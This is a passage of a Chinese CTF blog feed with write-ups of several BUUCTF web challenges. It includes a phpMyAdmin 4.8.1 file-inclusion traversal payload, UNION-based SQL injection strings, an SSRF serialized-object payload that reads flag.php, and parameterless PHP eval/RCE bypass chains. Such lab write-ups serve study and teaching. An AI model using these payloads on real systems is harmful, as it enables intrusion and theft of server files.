alt="image-20210806092557240"></p><p>或者</p><p><img src="/2021/08/06/buu/8/image-20210806092640868.png" alt="image-20210806092640868"></p><p>借鉴博客：[<a href="https://blog.csdn.net/qq_48008847/article/details/118804275">BJDCTF2020]ZJCTF，不过如此1_十九不瞌睡的博客-CSDN博客</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;0x00-知识点&quot;&gt;&lt;a href=&quot;#0x00-知识点&quot; class=&quot;headerlink&quot; title=&quot;0x00 知识点&quot;&gt;&lt;/a&gt;0x00 知识点&lt;/h3&gt;&lt;h4 id=&quot;file-get-contents&quot;&gt;&lt;a href=&quot;#file-get-con</summary>
      
    
    
    
    
    <category term="buu" scheme="http://daweitech.github.io/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>GWCTF 2019 我有一个数据库&amp;BJDCTF2020 The mystery of ip</title>
    <link href="http://daweitech.github.io/2021/08/03/buu/7/"/>
    <id>http://daweitech.github.io/2021/08/03/buu/7/</id>
    <published>2021-08-03T12:04:24.000Z</published>
    <updated>2021-08-24T13:41:55.402Z</updated>
    
    <content type="html"><![CDATA[<h2 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h2><p>打开页面，奇怪的乱码：</p><p><img src="/2021/08/03/buu/7/image-20210803200638733.png" alt="image-20210803200638733"></p><p>找了一个乱码恢复页面：<a href="http://www.mytju.com/classcode/tools/messycoderecover.asp">乱码恢复 (mytju.com)</a></p><p><img src="/2021/08/03/buu/7/image-20210803200740870.png" alt="image-20210803200740870"></p><p>在utf8格式下，只得到了无用信息：空的数据?我有一个数据库，但里面什么也没有~不信你找</p><p>在f12也不行后，我果断地拿起来神器——dirsearch！</p><p>一通扫描后果然有了眉目：</p><p><img src="/2021/08/03/buu/7/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(356).png"></p><p><img src="/2021/08/03/buu/7/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(357).png"></p><p>进入到<a href="http://e8451be4-2c39-421e-888a-2f04ad6a6de6.node4.buuoj.cn/phpmyadmin/index.php">e8451be4-2c39-421e-888a-2f04ad6a6de6.node4.buuoj.cn / mysql | phpMyAdmin 4.8.1</a></p><p><img src="/2021/08/03/buu/7/image-20210803201030523.png" alt="image-20210803201030523"></p><p>熟悉的phpmyadmin数据库页面</p><p>但是到了这里我就懵了，因为没有足够权限好像查不到flag在哪</p><p>查看了wp</p><p>原来这个版本漏洞可以利用，PhpMyadmin后台文件包含漏洞</p><h5 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h5><p><a href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247485036&idx=1&sn=8e9647906c5d94f72564dec5bc51a2ab&chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&mpshare=1&scene=1&srcid=0621gAv1FMtrgoahD01psMZr&pass_ticket=LqhRfckPxAVG2dF/jxV/9/cEb5pShRgewJe/ttJn2gIlIyGF/bsgGmzcbsV+LmMK#rd">【首发】phpmyadmin4.8.1后台getshell (qq.com)</a></p><p><a href="https://www.jianshu.com/p/fb9c2ae16d09">cve-2018-12613-PhpMyadmin后台文件包含 - 简书 (jianshu.com)</a></p><p>​    index.php中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include $_REQUEST[&#39;target&#39;];</span><br></pre></td></tr></table></figure><p>利用参数target</p><p>相关poc从参考文章中可知</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target&#x3D;db_datadict.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;</span><br></pre></td></tr></table></figure><p>经过尝试发现，读取时可以尽量多下几级（多../../）无影响，反之若少了则会报错</p><p>如下图</p><p><img src="/2021/08/03/buu/7/image-20210803202146319.png" alt="image-20210803202146319"></p><p><img src="/2021/08/03/buu/7/image-20210803202211040.png" alt="image-20210803202211040"></p><h5 id="参考博客："><a href="#参考博客：" class="headerlink" title="参考博客："></a>参考博客：</h5><p><a href="https://blog.csdn.net/SopRomeo/article/details/105536972">GWCTF 2019]我有一个数据库_SopRomeo的博客-CSDN博客</a></p><h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><p><img src="/2021/08/03/buu/7/image-20210804210338451.png" alt="image-20210804210338451"></p><p>分别查看Flag、Hint</p><p><img src="/2021/08/03/buu/7/image-20210804211511008.png" alt="image-20210804211511008"></p><p><img src="/2021/08/03/buu/7/image-20210804210443630.png" alt="image-20210804210443630"></p><p>看了源码，没有什么可以利用信息</p><p>查看wp，知道了标题的ip有所指</p><p>我们的ip能够被获取，怀疑是与XFF有关</p><p>接着我们进入火狐验证想法</p><p>添加X-Forwarded-For:127.0.0.1</p><p><img src="/2021/08/03/buu/7/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(366).png" alt="屏幕截图(366)"></p><p>看到回显显示：Your IP is : 127.0.0.1</p><p>说明了想法正确</p><p>利用模板注入</p><p><img src="/2021/08/03/buu/7/image-20210804211235273.png" alt="image-20210804211235273"></p><p><img src="/2021/08/03/buu/7/image-20210804211318879.png" alt="image-20210804211318879"></p><h5 id="知识点：SSTI模板注入"><a href="#知识点：SSTI模板注入" class="headerlink" title="知识点：SSTI模板注入"></a>知识点：SSTI模板注入</h5><p><a href="https://www.cnblogs.com/bmjoker/p/13508538.html">1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园 (cnblogs.com)</a></p><p><img src="/2021/08/03/buu/7/1625650-20200216204049347-1844990197.png" alt="img"></p><p>模板注入涉及的是服务端Web应用使用模板引擎渲染用户请求的过程<br>服务端把用户输入的内容渲染成模板就可能造成SSTI(Server-Side Template Injection)</p><h3 id="模板引擎"><a href="#模板引擎" class="headerlink" title="模板引擎"></a>模板引擎</h3><h5 id="参考博客：-1"><a href="#参考博客：-1" class="headerlink" title="参考博客："></a>参考博客：</h5><h5 id="BJDCTF2020-The-mystery-of-ip-fightte的博客-CSDN博客"><a href="#BJDCTF2020-The-mystery-of-ip-fightte的博客-CSDN博客" class="headerlink" title="BJDCTF2020]The mystery of ip_fightte的博客-CSDN博客"></a><a href="https://blog.csdn.net/fightte/article/details/117003439">BJDCTF2020]The mystery of ip_fightte的博客-CSDN博客</a></h5><p>[<a href="https://www.cnblogs.com/wangtanzhi/p/12318630.html">BJDCTF2020]The mystery of ip - 王叹之 - 博客园 (cnblogs.com)</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;GWCTF-2019-我有一个数据库&quot;&gt;&lt;a href=&quot;#GWCTF-2019-我有一个数据库&quot; class=&quot;headerlink&quot; title=&quot;[GWCTF 2019]我有一个数据库&quot;&gt;&lt;/a&gt;[GWCTF 2019]我有一个数据库&lt;/h2&gt;&lt;p&gt;打开页面</summary>
      
    
    
    
    
    <category term="buu" scheme="http://daweitech.github.io/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>网鼎杯 2018 Fakebook</title>
    <link href="http://daweitech.github.io/2021/08/02/buu/6/"/>
    <id>http://daweitech.github.io/2021/08/02/buu/6/</id>
    <published>2021-08-02T11:51:15.000Z</published>
    <updated>2021-08-24T13:40:07.938Z</updated>
    
    <content type="html"><![CDATA[<h4 id="题记"><a href="#题记" class="headerlink" title="题记"></a>题记</h4><p>先纪念一下啊，调试了好长一段时间才成功的扫描工具<strong>dirsearch</strong></p><p>总结运行成功的几个条件：</p><p>1.安装python版本3.7及以上，且要确保cmd命令行内默认版本正确（因为之前我为了使用GitHack而更改了python解释器）。</p><p>2.遇到如下报错时：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;D:\dirsearch\dirsearch.py&quot;, line 28, in &lt;module&gt;</span><br><span class="line">    from lib.controller.controller import Controller</span><br><span class="line">  File &quot;D:\dirsearch\lib\controller\__init__.py&quot;, line 1, in &lt;module&gt;</span><br><span class="line">    from .controller import Controller  # noqa: F401</span><br><span class="line">  File &quot;D:\dirsearch\lib\controller\controller.py&quot;, line 29, in &lt;module&gt;</span><br><span class="line">    from lib.connection.requester import Requester</span><br><span class="line">  File &quot;D:\dirsearch\lib\connection\requester.py&quot;, line 30, in &lt;module&gt;</span><br><span class="line">    from thirdparty.requests_ntlm import HttpNtlmAuth</span><br><span class="line">  File &quot;D:\dirsearch\thirdparty\requests_ntlm\__init__.py&quot;, line 1, in &lt;module&gt;</span><br><span class="line">    from .requests_ntlm import HttpNtlmAuth</span><br><span class="line">  File &quot;D:\dirsearch\thirdparty\requests_ntlm\requests_ntlm.py&quot;, line 5, in &lt;module&gt;</span><br><span class="line">    from cryptography import x509</span><br><span class="line">ModuleNotFoundError: No module named &#39;cryptography&#39;</span><br></pre></td></tr></table></figure><p>说明库没装上，可以去pycharm里自行安装完整。</p><p>附上图:</p><p><img src="/2021/08/02/buu/6/image-20210802195925831.png"></p><p><img src="/2021/08/02/buu/6/image-20210802200037618.png"></p><p><img src="/2021/08/02/buu/6/image-20210802200638164.png"></p><p>dirseach自带的字典在db目录下，使用格式以及常用参数如下：<br>py dirsearch.py<code>-</code>u [target url]<code>-</code>e<code>*</code></p><p><strong>-<code>u后面跟要扫的url</code></strong></p><p><strong>-<code>e是指定的url</code></strong></p><p><strong>-<code>w是指定字典</code></strong></p><p><strong>-<code>r递归目录</code></strong></p><p><strong>-<code>random</code>-agents使用随机UA</strong></p><p>还可以调低线程：dirsearch.py -u url -e * –timeout=2 -t 1 -x 400,403,404,500,503,429</p><hr><h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><p>打开后注册（join）进入·页面</p><p><img src="/2021/08/02/buu/6/image-20210803144611777.png" alt="image-20210803144611777"></p><p>点击后</p><p>发现了注入点：</p><p><img src="/2021/08/02/buu/6/image-20210803144818019.png" alt="image-20210803144818019"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">**Notice**:  unserialize(): Error at offset 0 of 1 bytes in **&#x2F;var&#x2F;www&#x2F;html&#x2F;view.php** on line **31**</span><br></pre></td></tr></table></figure><p>页面左上方提示了本题实际与序列化有关</p><p>查看wp知道了要用dirsearch扫描目录获取源文件</p><p>如下图状态码回响200时，出现了robots协议</p><p><img src="/2021/08/02/buu/6/image-20210802200638164.png" alt="image-20210802200638164"></p><p>按照提示访问下载user.php.bak</p><p><img src="/2021/08/02/buu/6/image-20210802200728401.png" alt="image-20210802200728401"></p><p>重命名为user.php,源打开代码：</p><p><img src="/2021/08/02/buu/6/image-20210802200825525.png" alt="image-20210802200825525"></p><h5 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h5><p><img src="/2021/08/02/buu/6/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjIyNDQy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h5 id="摘抄："><a href="#摘抄：" class="headerlink" title="摘抄："></a>摘抄：</h5><p>*<em>【</em>】curl_init ： 初始化一个cURL会话，供curl_setopt(), curl_exec()和curl_close() 函数使用。**</p><p>*<em>【</em>】curl_setopt ： 请求一个url。**<br><strong>其中CURLOPT_URL表示需要获取的URL地址，后面就是跟上了它的值。</strong></p><p>*<em>【</em>】CURLOPT_RETURNTRANSFER 将curl_exec()获取的信息以文件流的形式返回，而不是直接输出。**</p><p>*<em>【</em>】curl_exec，成功时返回 TRUE， 或者在失败时返回 FALSE。 然而，如果 CURLOPT_RETURNTRANSFER选项被设置，函数执行成功时会返回执行的结果，失败时返回 FALSE 。**</p><p>*<em>【</em>】CURLINFO_HTTP_CODE ：最后一个收到的HTTP代码。**<br><strong>curl_getinfo：以字符串形式返回它的值，因为设置了CURLINFO_HTTP_CODE，所以是返回的状态码。</strong></p><p><strong>如果状态码不是404，就返回exec的结果。</strong></p><p><img src="/2021/08/02/buu/6/20200420141747970.png" alt="在这里插入图片描述"></p><p><strong>这里说明了传的参数是blog</strong></p><p>通过分析，我们知道了这题涉及反序列化和ssrf</p><h5 id="实操："><a href="#实操：" class="headerlink" title="实操："></a>实操：</h5><p>我先继续爆破</p><p><img src="/2021/08/02/buu/6/image-20210803145941495.png" alt="image-20210803145941495"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?no&#x3D;-1 union&#x2F;**&#x2F; select 1,database(),3,4#</span><br></pre></td></tr></table></figure><p>得到数据库名：fakebook</p><p><img src="/2021/08/02/buu/6/image-20210803151032215.png" alt="image-20210803151032215"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?no&#x3D;-1 union&#x2F;**&#x2F; select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema&#x3D;&#39;fakebook&#39;#</span><br></pre></td></tr></table></figure><p>得到表名：users</p><p><img src="/2021/08/02/buu/6/image-20210803151215574.png" alt="image-20210803151215574"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?no&#x3D;-1 union&#x2F;**&#x2F; select 1,group_concat(column_name),3,4 from information_schema.columns where table_name&#x3D;&#39;users&#39;#</span><br></pre></td></tr></table></figure><p>得到列名：no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</p><p><img src="/2021/08/02/buu/6/image-20210803151357937.png" alt="image-20210803151357937"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?no&#x3D;-1 union&#x2F;**&#x2F; select 1,data,3,4 from users#</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?no&#x3D;-1 union&#x2F;**&#x2F;select 1,group_concat(no,username,passwd,data),3,4 from fakebook.users#</span><br></pre></td></tr></table></figure><p>当试到data时，出现了我们想要的部分序列化数据格式</p><p>O:8:”UserInfo”:3:{s:4:”name”;s:3:”123”;s:3:”age”;i:1;s:4:”blog”;s:13:”<a href="http://www.baidu.com&quot;;}/">www.baidu.com&quot;;}</a>            </p><p>这时候回到源代码上</p><p>我们来一手反序列化操作：</p><p>注：文件路径是扫描到的。</p><p><img src="/2021/08/02/buu/6/image-20210803153246831.png" alt="image-20210803153246831"></p><p>在本地www访问fakebook.php</p><p><img src="/2021/08/02/buu/6/image-20210803153215829.png" alt="image-20210803153215829"></p><p>构造payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union&#x2F;**&#x2F; select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;123&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;&#39;</span><br></pre></td></tr></table></figure><p><img src="/2021/08/02/buu/6/image-20210803153757132.png" alt="image-20210803153757132"></p><p><img src="/2021/08/02/buu/6/image-20210803153814758.png" alt="image-20210803153814758"></p><p><img src="/2021/08/02/buu/6/image-20210803153834055.png" alt="image-20210803153834055"></p><p>本文借鉴几个大佬博客：</p><p><a href="https://blog.csdn.net/qq_43622442/article/details/105633194">网鼎杯 2018]Fakebook_H9_dawn的博客-CSDN博客</a></p><p><a href="https://www.cnblogs.com/karsa/p/12652311.html">网鼎杯 2018]Fakebook - kar3a - 博客园 (cnblogs.com)</a></p><p><a href="https://cloud.tencent.com/developer/article/1682583">网鼎杯2018-Fakebook - 云+社区 - 腾讯云 (tencent.com)</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;题记&quot;&gt;&lt;a href=&quot;#题记&quot; class=&quot;headerlink&quot; title=&quot;题记&quot;&gt;&lt;/a&gt;题记&lt;/h4&gt;&lt;p&gt;先纪念一下啊，调试了好长一段时间才成功的扫描工具&lt;strong&gt;dirsearch&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;总结运行成功的几个条件：</summary>
      
    
    
    
    
    <category term="buu" scheme="http://daweitech.github.io/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>GXYCTF2019 禁止套娃</title>
    <link href="http://daweitech.github.io/2021/08/01/buu/5/"/>
    <id>http://daweitech.github.io/2021/08/01/buu/5/</id>
    <published>2021-08-01T07:18:57.000Z</published>
    <updated>2021-08-25T01:29:50.478Z</updated>
    
    <content type="html"><![CDATA[<p>​    靶机启动：</p><p><img src="/2021/08/01/buu/5/image-20210801193338875.png" alt="image-20210801193338875"></p><p>查看了源码无果，又试了一下index.php、robots协议之类的也不行，御剑没有扫描出来</p><p>查看了wp才知道这是git泄露。</p><h3 id="知识补充："><a href="#知识补充：" class="headerlink" title="知识补充："></a>知识补充：</h3><h4 id="简述-git文件导致的源码泄露"><a href="#简述-git文件导致的源码泄露" class="headerlink" title="简述.git文件导致的源码泄露"></a>简述.git文件导致的源码泄露</h4><p>.git文件是开发人员在开发过程中使用 Git(分布式版本控制系统)做开发时产生的隐藏目录，该文件包含一些版本信息和网站源码，数据库信息等敏感信息。</p><h4 id="原理利用"><a href="#原理利用" class="headerlink" title="原理利用"></a>原理利用</h4><p>1、通常开发人员在开发时，通常将源码提交到远程的托管网站（如Github）方便管理与交互，等到开发最后阶段，再将源码从远程服务器上下载到 web 目录下， 如果开发人员忘记将其中的 .git文件删除，则可以通过 .git文件恢复网站源码，来获取一些敏感信息；<br>2、开发人员对站点使用 Git 对版本进行控制，实现自动部署，如果配置不当，直接将 .git文件加载到线上环境，这样便引起了.git文件泄露。</p><p>这时候我们用了名为GitHack的工具</p><p>(需要python版本为2打头的，因为作者写的时候估计python解释器是参考python2的所以用python3会报错,下载地址为：<a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a>)</p><p>进行了扫描，获取源文件：</p><p><img src="/2021/08/01/buu/5/image-20210801194006477.png" alt="image-20210801194006477"></p><p><img src="/2021/08/01/buu/5/image-20210801194541670.png" alt="image-20210801194541670"></p><p>源码如下：</p><?phpinclude "flag.php";echo "flag在哪里呢？<br>";if(isset($_GET['exp'])){    if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp'])) {        if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {                // echo $_GET['exp'];                @eval($_GET['exp']);            }            else{                die("还差一点哦！");            }        }        else{            die("再好好想想！");        }    }    else{        die("还想读flag，臭弟弟！");    }}// highlight_file(__FILE__);?><p>我们的最终目的就是绕过之后通过eval函数来查询flag。</p><p>源码分析：</p><ul><li>需要通过<strong>GET</strong>方式传入参数<code>exp</code></li><li>第一层<code>preg_match()</code>函数限制了php伪协议，像封装协议之类的</li><li>第二层<code>preg_replace()</code>正则表达式匹配，<code>(?R)</code>表示引用当前表达式，只能匹配通过无参数的函数。</li><li>第三层<code>preg_match()</code>限制了一些关键字</li><li><code>@eval($_GET[&#39;exp&#39;]);</code>可以进行命令执行；典型的无参数RCE</li><li>虽然其不能使用php伪协议，但是@eval($_GET[‘exp’]);可以进行命令执行，所以使用scandir()函数列出当前目录中的文件和目录：</li></ul><p><img src="/2021/08/01/buu/5/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDAzNzI5Ng==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>第二层正则表达式无法给directory参数赋值，所以查找能够返回为’.’结果的函数；</p><p>首先需要得到当前目录下的文件<br>scandir()函数可以扫描当前目录下的文件，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">print_r(scandir(&#39;.&#39;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>那么问题就是如何构造<br>scandir(‘.’)</p><p>这里再看函数：</p><p>localeconv() 函数返回一包含本地数字及货币格式信息的数组。而数组第一项就是.<br>current() 返回数组中的当前单元, 默认取第一个值。<br>pos()是 current() 的别名。<br>这里还有一个知识点：</p><p><strong>current(localeconv())永远都是个点</strong></p><p>构造：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(current(localeconv())));</span><br><span class="line">print_r(scandir(pos(localeconv())));</span><br></pre></td></tr></table></figure><p><img src="/2021/08/01/buu/5/image-20210801200909285.png" alt="image-20210801200909285"></p><p>到这里我们也只是可以知道flag.php的存在</p><p>却还不能读取它的源码</p><p><img src="/2021/08/01/buu/5/1625650-20200204202458447-503722062.png" alt="img"></p><p>从上图的官方解释中可以知道</p><p>我们无法用单独的函数读取源码</p><p><strong>1.array_reverse()</strong><br>以相反的元素顺序返回数组</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp&#x3D;print_r(array_reverse(scandir(current(localeconv()))));</span><br></pre></td></tr></table></figure><p><strong>2.array_flip()</strong></p><p>交换数组的键和值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp&#x3D;print_r(array_flip(scandir(current(localeconv()))));</span><br></pre></td></tr></table></figure><p><strong>3.array_rand()</strong></p><p>从数组中随机取出一个或多个单元，不断刷新访问就会不断随机返回，本题目中scandir()返回的数组只有5个元素，刷新几次就能刷出来flag.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp&#x3D;print_r(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure><p>不能使用file_get_contents()，但是可以可以使用readfile()或highlight_file()以及其别名函数show_source()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exp&#x3D;print_r(readfile(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exp&#x3D;highlight_file(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exp&#x3D;show_source(session_id(session_start()));    </span><br></pre></td></tr></table></figure><p><img src="/2021/08/01/buu/5/image-20210801202551668.png" alt="image-20210801202551668"></p><p>参考博客：</p><p> <a href="https://www.cnblogs.com/wangtanzhi/p/12260986.html">GXYCTF2019]禁止套娃 - 王叹之 - 博客园 (cnblogs.com)</a></p><p> <a href="https://blog.csdn.net/weixin_44037296/article/details/111404335">GXYCTF2019] 禁止套娃_Senimo-CSDN博客_buuctf 禁止套娃</a></p><p> <a href="https://blog.csdn.net/rfrder/article/details/109627827">GXYCTF2019]禁止套娃 1_feng的博客-CSDN博客</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    靶机启动：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2021/08/01/buu/5/image-20210801193338875.png&quot; alt=&quot;image-20210801193338875&quot;&gt;&lt;/p&gt;
&lt;p&gt;查看了源码无果，又试了一下index.php、r</summary>
      
    
    
    
    
    <category term="buu" scheme="http://daweitech.github.io/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>CISCN 2019 初赛	Love Math</title>
    <link href="http://daweitech.github.io/2021/07/30/buu/4/"/>
    <id>http://daweitech.github.io/2021/07/30/buu/4/</id>
    <published>2021-07-30T07:14:34.000Z</published>
    <updated>2021-08-02T01:51:52.257Z</updated>
    
    <content type="html"><![CDATA[<p>​    这是一道非常好的绕过题目。</p><p><img src="/2021/07/30/buu/4/image-20210730151757624.png" alt="image-20210730151757624"></p><p>附上源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">&#x2F;&#x2F;听说你很喜欢数学，不知道你是否爱它胜过爱flag</span><br><span class="line">if(!isset($_GET[&#39;c&#39;]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    &#x2F;&#x2F;例子 c&#x3D;20-1</span><br><span class="line">    $content &#x3D; $_GET[&#39;c&#39;];</span><br><span class="line">    if (strlen($content) &gt;&#x3D; 80) &#123;</span><br><span class="line">        die(&quot;太长了不会算&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist &#x3D; [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;&#96;&#39;, &#39;\[&#39;, &#39;\]&#39;];</span><br><span class="line">    foreach ($blacklist as $blackitem) &#123;</span><br><span class="line">        if (preg_match(&#39;&#x2F;&#39; . $blackitem . &#39;&#x2F;m&#39;, $content)) &#123;</span><br><span class="line">            die(&quot;请不要输入奇奇怪怪的字符&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;常用数学函数http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;php&#x2F;php_ref_math.asp</span><br><span class="line">    $whitelist &#x3D; [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];</span><br><span class="line">    preg_match_all(&#39;&#x2F;[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*&#x2F;&#39;, $content, $used_funcs);  </span><br><span class="line">    foreach ($used_funcs[0] as $func) &#123;</span><br><span class="line">        if (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            die(&quot;请不要输入奇奇怪怪的函数&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;帮你算出答案</span><br><span class="line">    eval(&#39;echo &#39;.$content.&#39;;&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析：白名单里有些函数</p><h5 id="base-convert函数"><a href="#base-convert函数" class="headerlink" title="base_convert函数"></a><strong>base_convert</strong>函数<img src="/2021/07/30/buu/4/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pc3NodDA=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></h5><h5 id="hex2bin-函数"><a href="#hex2bin-函数" class="headerlink" title="hex2bin() 函数"></a>hex2bin() 函数</h5><p>hex2bin() 函数把十六进制值的字符串转换为 ASCII 字符。</p><h5 id="dechex-函数"><a href="#dechex-函数" class="headerlink" title="dechex() 函数"></a>dechex() 函数</h5><p>dechex() 函数把十进制数转换为十六进制数。</p><p>目标：执行system函数来完成查看flag的操作。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 